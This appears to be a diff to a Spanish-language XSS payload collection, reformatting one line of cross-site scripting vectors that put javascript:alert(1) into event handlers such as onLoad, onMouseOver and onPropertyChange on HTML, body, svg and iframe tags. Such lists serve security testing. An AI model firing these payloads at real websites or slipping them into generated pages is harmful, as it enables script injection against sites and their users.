@@ -180,6 +180,14 @@ Muchos mas:
 <title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange> <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad> 
 <body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter> 
 <body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus> <frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll> 
-<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange> <html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp> <body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange> <svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad> <body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide> <body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver> 
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
+
+<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
+
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)">
+</body onPropertyChange> <svg onLoad svg onLoad="javascript:javascript:alert(1)">
+</svg onLoad> <body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide> 
+<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver> 
+
 <body onUnload body onUnload="javascript:javascript:alert(1)">
 ```
